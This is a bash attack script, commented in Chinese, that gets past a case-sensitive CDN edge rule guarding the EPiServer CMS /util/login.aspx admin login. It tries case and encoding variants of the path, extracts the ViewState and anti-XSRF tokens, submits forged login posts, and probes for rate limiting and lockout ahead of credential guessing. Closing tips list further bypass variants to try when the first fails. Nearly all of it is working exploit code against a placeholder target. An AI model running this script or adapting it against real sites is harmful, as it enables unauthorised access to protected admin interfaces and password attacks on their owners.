#!/usr/bin/env bash
# =============================================================================
# EPiServer CMS /util/login.aspx：CDN 边缘规则（本例 Fastly VCL）按【小写字面】匹配 406，
# 改为大写/混合大小写路径即绕过 → 匿名取得完整 EPiServer 登录 WebForms 页
# （ViewState / EventValidation / __epiXSRF），且该页真实执行认证逻辑（错口令回 Login failed）。
#
# 适用面：EPiServer/Optimizely CMS 站点，运维方用边缘规则硬封 /util/ 前缀
#         （Util handler 是 EPiServer 内置登录/管理入口），但规则实现是大小写敏感字面匹配。
# 前置：无需任何账号/Cookie；目标 443 对公网开放，CDN 前置。
#
# 用法：
#   T=https://host bash episerver_util_case_bypass.sh
#   T=https://host bash episerver_util_case_bypass.sh /UTIL%2fLOGIN.ASPX   # 指定变体
# 落盘：当前工作目录 page.html / post.html
# =============================================================================
set -u

T="${1:-https://TARGET}"; T="${T%/}"
VAR="${2:-/UTIL/LOGIN.ASPX}"
UA="${ARTEX_UA:-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36}"

req(){ curl -sk --path-as-is --max-time 25 -A "$UA" "$@"; }

echo "== [0] 基线：小写字面应被边缘规则拦成 406/0B（若是 404，说明是路由不存在，另一码事）"
req -o /dev/null -w '  GET /util/login.aspx -> %{http_code} | %{size_download}B | %{content_type}\n' "$T/util/login.aspx"

echo "== [1] 变体矩阵：判据 = 同一资源在不同大小写/分隔符下响应不同"
for p in /UTIL/LOGIN.ASPX /Util/Login.aspx /UTIL%2fLOGIN.ASPX /UTIL/./LOGIN.ASPX /UTIL/LOGIN.ASPX/ \
         /util/login.aspx /%75til/login.aspx /util%2flogin.aspx; do
  req -o /dev/null -w "  %-24s -> %{http_code} | %{size_download}B\n" "$T$p"
done
# 实测口径（来源目标）：
#   大写族 200 / ~8025B ；小写族 406 / 0B
#   /%75til/login.aspx（把 u 百分号编码成小写）仍 406 → 规则匹配解码后的字面值且区分大小写
#   /UTIL/./LOGIN.ASPX 与 /UTIL/LOGIN.ASPX/ 也 200 → 边缘未做路径归一化，回源后由 EPiServer 路由吃掉

echo "== [2] 取页面并确认真是 EPiServer 登录 WebForms"
req "$T$VAR" -o page.html -w '  GET page -> %{http_code} | %{size_download}B | %{content_type}\n'
for k in '__VIEWSTATE' '__VIEWSTATEGENERATOR' '__EVENTVALIDATION' '__epiXSRF' 'aspnetForm'; do
  printf '  %-24s hits=' "$k"; grep -c -- "$k" page.html
done
grep -oiE 'name="__VIEWSTATEGENERATOR"[^>]*value="[^"]*"' page.html | head -1

field(){ python3 - "$1" <<'PY'
import re, sys
html = open('page.html', encoding='utf-8', errors='ignore').read()
m = re.search(r'name="%s"[^>]*value="([^"]*)"' % re.escape(sys.argv[1]), html)
print(m.group(1) if m else '')
PY
}

VS="$(field __VIEWSTATE)"; GEN="$(field __VIEWSTATEGENERATOR)"
EV="$(field __EVENTVALIDATION)"; XSRF="$(field __epiXSRF)"
echo "  token lens: VIEWSTATE=${#VS} GEN=$GEN EVENTVALIDATION=${#EV} epiXSRF=${#XSRF}"
[ -n "$VS" ] && [ -n "$XSRF" ] || { echo "  [STOP] 缺 ViewState/XSRF，页面不是登录表单（可能被缓存页/WAF 挑战页替换）"; exit 1; }

echo "== [3] POST 错口令：__epiXSRF 双提交（Cookie + 表单同值）+ 合法 ViewState → 应进业务层"
req -o post.html -w '  POST login -> %{http_code} | %{size_download}B\n' \
  -H "Cookie: __epiXSRF=$XSRF" \
  --data-urlencode "__LASTFOCUS=" \
  --data-urlencode "__epiXSRF=$XSRF" \
  --data-urlencode "__EVENTTARGET=" \
  --data-urlencode "__EVENTARGUMENT=" \
  --data-urlencode "__VIEWSTATE=$VS" \
  --data-urlencode "__VIEWSTATEGENERATOR=$GEN" \
  --data-urlencode "__EVENTVALIDATION=$EV" \
  --data-urlencode 'LoginControl$UserName=zzqnotexist_991' \
  --data-urlencode 'LoginControl$Password=ZzqWrong!42' \
  --data-urlencode 'LoginControl$Button1=Log in' \
  "$T$VAR"
grep -oiE 'login failed|invalid login|incorrect|error[^<]{0,80}' post.html | head -5
echo "  判据：200 + Login failed = 认证逻辑真实执行；若回 500/跳转，多为 XSRF 未对齐或 ViewState 已过期（重新 GET 取新 token）"

echo "== [4] 阴性对照：篡改 ViewState 一个字符 → 期望 500（加密+MAC 生效，无 machineKey 不可伪造）"
BAD="$(python3 - "$VS" <<'PY'
import sys
s = sys.argv[1]; i = len(s)//2
print(s[:i] + ('A' if s[i] != 'A' else 'B') + s[i+1:])
PY
)"
req -o /dev/null -w '  tampered VIEWSTATE -> %{http_code} | %{size_download}B\n' \
  -H "Cookie: __epiXSRF=$XSRF" \
  --data-urlencode "__epiXSRF=$XSRF" \
  --data-urlencode "__VIEWSTATE=$BAD" \
  --data-urlencode "__VIEWSTATEGENERATOR=$GEN" \
  --data-urlencode "__EVENTVALIDATION=$EV" \
  --data-urlencode 'LoginControl$UserName=zzqnotexist_991' \
  --data-urlencode 'LoginControl$Password=ZzqWrong!42' \
  --data-urlencode 'LoginControl$Button1=Log in' \
  "$T$VAR"

echo "== [5] 限速/锁定探测（低频，5 次；仅为判定有无 429/验证码，勿据此判定可无限爆破）"
i=0; hit=0
while [ $i -lt 5 ]; do
  i=$((i+1))
  out="$(req -o /dev/null -w '%{http_code}|%{size_download}' -H "Cookie: __epiXSRF=$XSRF" \
      --data-urlencode "__epiXSRF=$XSRF" --data-urlencode "__VIEWSTATE=$VS" \
      --data-urlencode "__VIEWSTATEGENERATOR=$GEN" --data-urlencode "__EVENTVALIDATION=$EV" \
      --data-urlencode 'LoginControl$UserName=zzq_ratelimit_probe' \
      --data-urlencode "LoginControl\$Password=ZzqWrong$i!" \
      --data-urlencode 'LoginControl$Button1=Log in' "$T$VAR")"
  echo "  #$i -> $out"
  case "$out" in 429*|403*) echo "  [STOP] 出现限速/拦截特征"; hit=1; break;; esac
  sleep 1
done
[ $hit -eq 0 ] && echo "  [-] 5 次未触发限速（来源目标 8 次连续失败均 200/8214B，无 429/锁定/验证码）"

cat <<'TIPS'

=== 失败时的常见原因 ===
1) /UTIL/LOGIN.ASPX 也 406 → 规则做了 tolower / 正则 (?i) / 路径归一化；改试 %2f、尾斜杠、;path、双写 %2555，
   全部同码即该防护无缺口，收工。
2) 200 但正文 0 字节或非登录页 → 边缘返回缓存/挑战页；换浏览器 UA、加 Accept: text/html，禁用缓存（-H 'Cache-Control: no-cache'）。
3) POST 回 500 且页面提示 XSRF → __epiXSRF Cookie 与表单值不一致，或 ViewState 已过期；重新 GET 同一变体路径取新 token。
4) POST 回 302 到 /util/login.aspx?ReturnUrl=... → 该路径被应用层加了额外跳转；
   检查是否必须带 __LASTFOCUS/__EVENTTARGET 原值（有些 EPiServer 版本校验 form field 集合）。
5) 只改大小写返回 200 但 content-length 与基线一致为 0 → CDN 的 200 是假成功（body 被清空），必须 grep 到 __VIEWSTATE 才算命中。
6) 目标不是 EPiServer → 该页面不会有 __VIEWSTATEGENERATOR/__epiXSRF；改按框架指纹重新定性，不要硬套。
TIPS